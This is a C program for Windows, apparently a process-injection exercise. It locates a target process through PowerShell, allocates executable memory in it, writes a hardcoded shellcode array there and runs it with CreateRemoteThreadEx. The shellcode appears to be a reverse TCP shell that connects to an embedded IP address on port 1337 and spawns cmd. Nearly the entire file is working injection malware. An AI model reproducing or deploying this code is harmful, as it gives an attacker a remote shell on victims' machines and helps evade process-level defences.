#include <windows.h>
#include <stdio.h>

const char * k = "[+]";
const char * e = "[-]";
const char * i = "[*]";

int main()
{
    LPSTR command = "powershell -Command Get-Process | ?{$_.Name -eq 'test'} | Select-Object -ExpandProperty Id";
    //Need to write output from this to buffer


    //Form a pipe for IPC communication.
    //Will grab the output from the PowerShell process and pass it to the C process via a buffer

    HANDLE hPipeRead, hPipeWrite;
    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL; 

    if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0)) {
        printf("CreatePipe failed (%d).\n", GetLastError());
        return 1;
    }

    // Create process information struct
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si)); //zeros it out to know state
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    si.hStdOutput = hPipeWrite; //Setting process output in struct to be pipe write handle
    si.dwFlags |= STARTF_USESTDHANDLES;

    // Start the child process
    if (!CreateProcess(NULL,   // No module name (use command line)
                       command, // Command line
                       NULL,    // Process handle not inheritable
                       NULL,    // Thread handle not inheritable
                       TRUE,   // Need to have handle for output here so I can reference 
                       0,       // No creation flags
                       NULL,    // Use parent's environment block
                       NULL,    // Use parent's starting directory
                       &si,     // Pointer to STARTUPINFO structure
                       &pi))    // Pointer to PROCESS_INFORMATION structure
    {
        printf("CreateProcess failed (%d).\n", GetLastError());
        return 1;
    }

    // Wait until child process exits
    //WaitForSingleObject(pi.hProcess, INFINITE); Only need this line if wanting the PowerShell process directly
    
    //Once we have the child process output
    CloseHandle(hPipeWrite);

    CHAR buffer[4096];
    DWORD bytesRead;
    if (!ReadFile(hPipeRead, buffer, sizeof(buffer), &bytesRead, NULL)) {
        printf("ReadFile failed (%d).\n", GetLastError());
        return 1;
    }
    CloseHandle(hPipeRead);

    // Null-terminate the buffer to print it as a string
    buffer[bytesRead] = '\0';

    // Close process and thread handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    //Output our information
    PVOID rBuffer = NULL;
    DWORD dwPID = NULL, dwTID = NULL;
    HANDLE hProcess = NULL, hThread = NULL; 

    dwPID = atoi(buffer);
    printf("%s trying to get a handle to the process (%ld)\n", i, dwPID);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID); //Privs and PID of proocess we want handle to 
    if(hProcess == NULL)
    {
        printf("failed to get process handle, error: 0x%1x", GetLastError()); //GetLastError is from Microsoft. Value is the calling threads last error code.
        return EXIT_FAILURE;
    }

unsigned char test[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x05\x39\xbe\x64\x3c\xc9"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

    size_t testSize = sizeof(test);

    //Create a space for our process to exist in 
    rBuffer = VirtualAllocEx(hProcess, NULL, testSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); // (MEM_RESERVE | MEM_COMMIT) allows you to do both
    //Making permission rw first then once it is established (made), use virtualprotect() to make it read write execute
    //Use documenation to do this with virtual protect
    //Memory protection constants can also be written in hex

    //Virtual protext is use in field a lot.

    if(rBuffer == NULL)
    {
        printf("%s failed to get allocate buffer, error: 0x%1x", k, GetLastError());
        return EXIT_FAILURE;
    }


    //Make our process happen
    WriteProcessMemory(hProcess, rBuffer, test, testSize, NULL);
    printf("%s wrote shellcode to the buffer\n", k); //Now I need to have a thread that envokes the information in that buffer

    hThread = CreateRemoteThreadEx(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)rBuffer, 
        NULL,
        0,
        0,
        &dwTID);
    
    if(hThread == NULL)
    {
        printf("Failed to get handle");
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    printf("%s waiting for thread to finish\n", k);
    WaitForSingleObject(hThread, INFINITE);
    printf("%s thread finished executing\n", k);

    return EXIT_SUCCESS;
}